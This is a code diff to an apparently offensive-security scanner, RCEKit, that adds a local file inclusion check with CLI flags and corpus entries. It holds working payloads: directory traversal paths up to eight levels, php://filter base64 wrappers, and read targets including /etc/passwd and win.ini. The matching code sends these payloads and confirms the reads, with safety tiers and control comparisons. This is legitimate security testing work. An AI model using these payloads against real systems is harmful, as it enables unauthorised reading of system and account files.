@@ -46,7 +46,7 @@ def configure_logging() -> None:
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "3.10.0"
+__version__ = "3.11.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -1068,6 +1068,8 @@ class RCEKit:
         # bridges are: the catalogue is the part that grows, and growing it
         # should not need Python.
         self.argv_primitives: Dict[str, Dict[str, Any]] = {}
+        self.include_wrappers: Dict[str, Dict[str, Any]] = {}
+        self.include_read_targets: Dict[str, List[Dict[str, Any]]] = {}
         self._load_template_payloads()
 
         # Encoding and obfuscation techniques.
@@ -1149,6 +1151,8 @@ class RCEKit:
             self.bridges = data.get("bridges", {})
             self.deser_probes = data.get("deser_probes", {})
             self.argv_primitives = data.get("argv_primitives", {})
+            self.include_wrappers = data.get("include_wrappers", {})
+            self.include_read_targets = data.get("include_read_targets", {})
         except Exception as exc:
             message = f"unable to parse {self.template_path}: {exc}"
             logger.error("%s", message)
@@ -1176,6 +1180,8 @@ class RCEKit:
             self.bridges = data.get("bridges", {})
             self.deser_probes = data.get("deser_probes", {})
             self.argv_primitives = data.get("argv_primitives", {})
+            self.include_wrappers = data.get("include_wrappers", {})
+            self.include_read_targets = data.get("include_read_targets", {})
         except Exception as exc:  # pragma: no cover — a build-time guarantee
             message = f"unable to parse the built-in payload corpus: {exc}"
             logger.error("%s", message)
@@ -5858,6 +5864,202 @@ class FileBased(DetectionMethod):
                        f"target wrote and served token {probe.expected!r} (execution + write primitive)")
 
 
+class FileInclude(DetectionMethod):
+    """A sink that opens a path the request names, and returns what it read.
+
+    ``file`` writes a file and reads it back; this reads one it did not write.
+    The two are siblings, and the asymmetry between their tiers is the whole of
+    what this class has to be careful about.
+
+    **Why this cannot reach ``executed``, structurally.** Every method here that
+    proves execution rests on a value RCEKit *computed* from operands random to
+    that probe, because that is the one thing reflection cannot produce. A file
+    read has no such value: RCEKit does not know what is in the target's files,
+    so the evidence can only be content it recognises -- a signature it knew in
+    advance. A static signature differenced against a payload-free control is
+    exactly the evidence 3.8.0 demoted the chain's in-band verdict for, and the
+    reasoning does not change because the subject did. So the ceiling here is
+    ``file-read``: a settled measurement about something other than execution,
+    named for what the target did, and with no path upward.
+
+    **And the signature has to be the file's content, not the path.** Measured
+    against vulhub php/inclusion: a sink that fails to open the path echoes it
+    back, twice, inside PHP's own warning. An oracle asking "did my string come
+    back" confirms on every probe there, against a target that read nothing. The
+    path is therefore carried as ``forbidden`` -- its presence says the sink
+    reflected the request -- and only the content signature decides the verdict.
+
+    **What it sends.** The cross-product of the wrappers and the read targets
+    the corpus declares for this dialect, each at every traversal depth from an
+    absolute path down. Depth is swept rather than configured because which one
+    works is a property of the sink's own path handling: the same target
+    answered an absolute ``/proc/version`` and a relative
+    ``../../../proc/version`` alike, and a sink that strips a leading slash
+    answers only the second.
+
+    The catalogue lives in the corpus (``include_wrappers`` and
+    ``include_read_targets``) rather than here, which is the seam the bridges,
+    the eval carriers and ``argv_primitives`` already use: a wrapper or a
+    recognisable file can be added without touching Python.
+
+    **The default read target is chosen for what it does not return.** Proving a
+    read needs content predictable enough to recognise and absent from the
+    control; it does not need the target's secrets on the operator's screen. So
+    ``/proc/version`` is the default and ``/etc/passwd`` sits one safety rung
+    up, the way the corpus already gates credential-adjacent payloads -- a
+    default run proves the read with a kernel build string, and account names
+    come back only for an operator who asked.
+
+    **Execution is deliberately not here**, and the reason is measured rather
+    than assumed. The route from an inclusion sink to execution is a wrapper
+    carrying code -- ``data://``, ``php://input`` -- and both need
+    ``allow_url_include``, which PHP has defaulted off since 5.2. The target
+    said so itself: *"data:// wrapper is disabled in the server configuration by
+    allow_url_include=0"*. The route that does work on a real build is
+    two-step -- poison a log or a session file, then include it -- which is a
+    chain, and a chain became a delivery the engine drives only in 3.9.0.
+    Shipping an execution path with no case to exercise it is a claim the bench
+    cannot reproduce, which this project treats as worse than a missing
+    feature, so it waits for the case rather than for the code."""
+    name = "include"
+    tier = "file-read"
+    # Its own question, not `execution`. A run stops asking a question once it
+    # is answered, so leaving the default would skip this method on any target
+    # where execution was already proven -- discarding a finding with its own
+    # remediation, which is the mistake `lookup` declares a question to avoid.
+    question = "file-read"
+    safety = "safe"
+
+    # Absolute first, then deepening. Eight is where a traversal from a web root
+    # has long since reached `/` on every layout worth probing, and each rung
+    # past the one that works costs a request and answers the same.
+    _DEPTHS = tuple(range(0, 9))
+    _QUICK_DEPTHS = (0, 3, 5, 7)
+
+    def _targets(self, sink_env: str) -> List[Dict[str, Any]]:
+        """The readable files declared for this dialect, within the run's rung."""
+        declared: Dict[str, Any] = getattr(self.gen, "include_read_targets", None) or {}
+        allowed = self.config.get("max_safety") or "safe"
+        out = []
+        for entry in declared.get(sink_env) or []:
+            if not (entry.get("path") and entry.get("signature")):
+                # A target with no path or no signature can never confirm, and
+                # an unconfirmable probe still counts toward the coverage the
+                # run reports.
+                continue
+            if SAFETY_ORDER.get(entry.get("safety") or "safe", 0) > SAFETY_ORDER.get(allowed, 0):
+                continue
+            out.append(entry)
+        return out
+
+    def _wrappers(self, sink_env: str) -> List[Tuple[str, Dict[str, Any]]]:
+        """``(name, wrapper)`` for each selected wrapper this dialect can carry.
+
+        An unknown name raises rather than narrowing the run silently, for the
+        reason :meth:`_selected_bridges` gives: a typo that selected nothing
+        would report a clean negative from a run that sent no probe at all."""
+        declared: Dict[str, Any] = getattr(self.gen, "include_wrappers", None) or {}
+        wanted = self.config.get("include_wrappers") or ("auto",)
+        if tuple(wanted) == ("auto",):
+            names = list(declared)
+        else:
+            unknown = [w for w in wanted if w not in declared]
+            if unknown:
+                raise ValueError(
+                    f"unknown include wrapper: {', '.join(unknown)}; choose from "
+                    f"auto, {', '.join(sorted(declared))}")
+            names = list(wanted)
+        allowed = self.config.get("max_safety") or "safe"
+        out: List[Tuple[str, Dict[str, Any]]] = []
+        for name in dict.fromkeys(names):
+            spec = declared[name]
+            # `any` is the usual answer and the default, because a wrapper is
+            # not where the dialect lives: `plain` is only a path, and
+            # php://filter works wherever PHP runs, Windows included. What
+            # differs per dialect is which files are there to read, which is
+            # `include_read_targets`. The field stays for a wrapper that really
+            # is dialect-bound.
+            declared_env = spec.get("sink_env") or "any"
+            if declared_env != "any" and declared_env != sink_env:
+                continue
+            if SAFETY_ORDER.get(spec.get("safety") or "safe", 0) > SAFETY_ORDER.get(allowed, 0):
+                continue
+            if "__PATH__" not in str(spec.get("template", "")):
+                continue
+            out.append((name, spec))
+        return out
+
+    def applicable(self, record: "PayloadRecord") -> bool:
+        # A path arrives as a *value*, so the contexts that carry the injected
+        # value as code are not where an inclusion sink reads from. Not gated on
+        # an environment: opening a path the request named is a property of the
+        # application, not of a shell dialect, and the dialect only decides
+        # which files are there to read.
+        if record.context in CODE_POSITION_CONTEXTS:
+            return False
+        sink_env = self._sink_env(record)
+        return bool(self._targets(sink_env)) and bool(self._wrappers(sink_env))
+
+    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
+        sink_env = self._sink_env(record)
+        windows = sink_env in WINDOWS_PATH_SINK_ENVS
+        depths = self._DEPTHS if self._depth() == "full" else self._QUICK_DEPTHS
+        probes: List[Probe] = []
+        for target in self._targets(sink_env):
+            path = str(target["path"])
+            signature = str(target["signature"])
+            for wrapper_name, wrapper in self._wrappers(sink_env):
+                template = str(wrapper["template"])
+                for depth in depths:
+                    if depth:
+                        # A relative climb, for a sink that rejects or rewrites a
+                        # leading separator. The drive letter goes with it: what
+                        # a climb reaches is a path relative to the sink's own
+                        # directory, so `C:\` would make it absolute again.
+                        stem = path[3:] if windows and path[1:3] == ":\\" else path.lstrip("/\\")
+                        up = ("..\\" if windows else "../") * depth
+                        rendered = template.replace("__PATH__", up + stem)
+                    else:
+                        rendered = template.replace("__PATH__", path)
+                    if self._context_swallows(record, rendered):
+                        continue
+                    probes.append(Probe(
+                        payload=self._wrap_context(record, rendered),
+                        expected=signature,
+                        # The path, not the signature: a sink that cannot open it
+                        # echoes it back inside its own error, and that is
+                        # reflection rather than a read.
+                        forbidden=rendered,
+                        carrier=f"{wrapper_name}/depth{depth}"))
+        return probes
+
+    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
+        if obs.status is None:
+            return Verdict("error", f"request never reached the target ({obs.body[:120]})")
+        channel = self._search_channels(probe.expected,
+                                        self._channels_of(obs.body, obs.channels))
+        if channel is None:
+            return Verdict("negative", "no readable file content in the response")
+        # The signature is static, so its presence without the payload means it
+        # did not get there by being read. Checked across every channel of the
+        # control rather than only the one that matched, for the reason
+        # :meth:`_confirm_computed` gives.
+        if self._search_channels(probe.expected,
+                                 self._channels_of(obs.control_body, obs.control_channels)):
+            return Verdict("inconclusive",
+                           "that content is in the payload-free control too, so the "
+                           "response does not show a file was read")
+        note = ""
+        if probe.forbidden and self._search(probe.forbidden, obs.body):
+            # Worth saying and not a downgrade: a sink that both echoes the path
+            # and returns the content has still returned the content.
+            note = "; the target also echoes the path it was given"
+        return Verdict("file-read",
+                       f"target returned content of {probe.expected!r} from a path RCEKit "
+                       f"named{f' in the {channel}' if channel else ''}, absent from the "
+                       f"payload-free control{note} (arbitrary file read, NOT execution)")
+
+
 class WriteThenExecute(DetectionMethod):
     """The inverse of :class:`FileBased`, for the class where nothing computes.
 
@@ -7929,6 +8131,7 @@ DETECTION_METHODS = {
     DeserSink.name: DeserSink,
     BooleanDifferential.name: BooleanDifferential,
     ArgvInjection.name: ArgvInjection,
+    FileInclude.name: FileInclude,
 }
 
 # Methods one probe of which buys an answer. Derived, so a method added later
@@ -8159,6 +8362,11 @@ NON_EXECUTION_SECTIONS = (
     ("file-write", "ARBITRARY FILE WRITE(S)",
      "the file is on the target and RCEKit read it back verbatim, so the directory is "
      "reachable but not interpreted. A real finding, and not RCE.", False),
+    ("file-read", "ARBITRARY FILE READ(S)",
+     "the target opened a path RCEKit named and returned what it read, and that content "
+     "is absent from the payload-free control. What proves it is a signature RCEKit knew "
+     "in advance rather than a value the target computed, which is why it stops here: a "
+     "real finding, and not RCE.", False),
     ("evaluation-sink", "EVALUATION SINK(S)",
      "an evaluator consumed the input and partitioned the response on it. Which "
      "evaluator is not shown: a query engine comparing two numbers produces this same "
@@ -10347,6 +10555,10 @@ def main(argv: Optional[List[str]] = None) -> int:
                              "value becomes one of its arguments and an option it names runs a "
                              "command, so every separator is inert and reflected reaches nothing "
                              "— needs --argv-binary, reaches executed). "
+                             "include (a sink that opens a path the request names and returns what it "
+                             "read, proven on content absent from the payload-free control — reaches "
+                             "file-read, never executed, because the evidence is a signature RCEKit "
+                             "knew in advance rather than a value the target computed). "
                              "Opt-in and additive: when omitted, verification keeps its existing behaviour "
                              "unchanged.")
     parser.add_argument("--detect-json", default=None, metavar="PATH",
@@ -10444,6 +10656,16 @@ def main(argv: Optional[List[str]] = None) -> int:
                              "Off by default because a bridge payload is SQL or XML syntax: on an "
                              "ordinary shell sink it is a request that cannot confirm. A stateful "
                              "bridge also needs --verify-active-risk stateful.")
+    parser.add_argument("--include-wrappers", default=None, metavar="NAMES",
+                        help="(--methods include) Which inclusion wrappers to send: auto "
+                             "(default, the whole corpus 'include_wrappers' section) or a "
+                             "comma-separated list of entry names. Unlike --argv-binary this "
+                             "defaults to everything, because a wrapper is a way of naming a "
+                             "path rather than a program-specific option, so there is nothing "
+                             "target-specific to know first. Which file is read, and whether a "
+                             "credential-adjacent one is read at all, is decided by "
+                             "--verify-active-risk and the corpus 'include_read_targets' "
+                             "section instead.")
     parser.add_argument("--argv-binary", default=None, metavar="NAMES",
                         help="(--methods argv) Which spawned program's options to inject: none "
                              "(default), auto, a primitive name from the corpus 'argv_primitives' "
@@ -10581,6 +10803,8 @@ def main(argv: Optional[List[str]] = None) -> int:
         # by default, and both must refuse a typo rather than narrow the run to
         # nothing and call the result clean.
         argv_binaries = parse_bridges(from_profile(args.argv_binary, "argv_binary"))
+        include_wrappers = parse_bridges(
+            from_profile(args.include_wrappers, "include_wrappers"))
         deser_formats = _parse_name_list(from_profile(args.deser_formats, "deser_formats"))
     except ValueError as exc:
         print(f"[!] {exc}")
@@ -11073,6 +11297,7 @@ def main(argv: Optional[List[str]] = None) -> int:
                                 "observe_headers": observe_headers,
                                 "bridges": bridges,
                                 "argv_binaries": argv_binaries,
+                                "include_wrappers": include_wrappers,
                                 "deser_formats": deser_formats,
                                 # The bridges honour the same safety ordering as
                                 # every corpus payload, so a stateful bridge is
@@ -12580,6 +12805,51 @@ EMBEDDED_PAYLOAD_CORPUS = r"""
       "notes": "%pipe% tells Ghostscript to open its output device as a pipe to the named command, via popen(), which runs it through a shell. The command's own stdout is inherited from Ghostscript rather than consumed by it -- Ghostscript writes the rendered page INTO the command's stdin -- which is what makes an in-band proof possible here. That property is the one to check before adding a primitive: two candidates were cut from this catalogue for failing it. ssh -oProxyCommand= runs through a shell but its stdout IS the SSH transport, and rsync --rsh= does not use a shell at all and its stdout IS the rsync protocol stream, so neither can return a computed value to the caller however well the option works. This is argument injection rather than the better-known Ghostscript bugs, which are -dSAFER escapes carried in PostScript *file content* and so are not reachable from an argv element at all.",
       "verified": "not validated against a live Ghostscript here; the popen() path and the inherited stdout are documented output-device behaviour"
     }
+  },
+  "include_wrappers": {
+    "plain": {
+      "sink_env": "any",
+      "safety": "safe",
+      "template": "__PATH__",
+      "requires": ["the value reaches a file-opening sink as the path, or as a prefix of one"],
+      "notes": "The path with nothing around it. Measured against vulhub php/inclusion, whose lfi.php is `include $_GET['file'];`: an absolute path is honoured, and so is a relative one once enough `../` are in front of it. Both are sent because which works is a property of the sink's own path handling, not of the target.",
+      "verified": "vulhub php/inclusion (vulhub/php:7.1.3-apache), 2026-10-31: /proc/version returned its content and ../../../proc/version returned the same"
+    },
+    "php_filter_base64": {
+      "sink_env": "any",
+      "safety": "safe",
+      "template": "php://filter/convert.base64-encode/resource=__PATH__",
+      "requires": ["a PHP stream-wrapper-aware sink (include, file_get_contents, readfile)"],
+      "notes": "Reads through a PHP filter, which base64-encodes the content on the way out. It needs no extra oracle: RCEKit's evidence search already peels base64 runs of 16 characters or more, and a file's worth of base64 is far past that, so the same content signature is found inside the encoded blob. It is worth sending beside `plain` because it proves more about the sink -- a stream wrapper was honoured, which `file_get_contents` of a plain path does not show -- and because it reads a file that a bare include would have *executed* instead of printing. Nothing here needs allow_url_include: the resource is local and the filter is not a URL wrapper.",
+      "verified": "vulhub php/inclusion, 2026-10-31: resource=/proc/version returned a 196-character base64 run decoding to the file's content"
+    }
+  },
+  "include_read_targets": {
+    "unix": [
+      {
+        "path": "/proc/version",
+        "signature": "Linux version",
+        "safety": "safe",
+        "notes": "The default, and chosen for what it does NOT return. Proving a read needs content that is predictable enough to recognise and absent from the payload-free control; it does not need the target's secrets on the operator's screen. This file satisfies the first and carries nothing but a kernel build string. Present on every Linux container.",
+        "verified": "vulhub php/inclusion, 2026-10-31: returned 'Linux version 5.15.167.4-microsoft-standard-WSL2 ...'"
+      },
+      {
+        "path": "/etc/passwd",
+        "signature": "root:x:0:0:",
+        "safety": "intrusive",
+        "notes": "The classic, held one rung up because it returns account names. The corpus already gates credential-adjacent reads this way, so a default run proves the read with /proc/version and only an operator who asked for the higher rung pulls account data back. Worth having for a target with no /proc -- a BSD, or a chroot that does not mount it.",
+        "verified": "vulhub php/inclusion, 2026-10-31: returned 'root:x:0:0:root:/root:/bin/bash'"
+      }
+    ],
+    "windows": [
+      {
+        "path": "C:\\Windows\\win.ini",
+        "signature": "; for 16-bit app support",
+        "safety": "safe",
+        "notes": "The Windows equivalent, and sensitive in nothing. Shipped from documentation rather than measurement: no Windows target is in the bench suite, so this entry is a shape offered to an operator who has one and not a path this project has confirmed.",
+        "verified": "not validated against a live Windows target here"
+      }
+    ]
   },
   "deser_probes": {
     "java": {
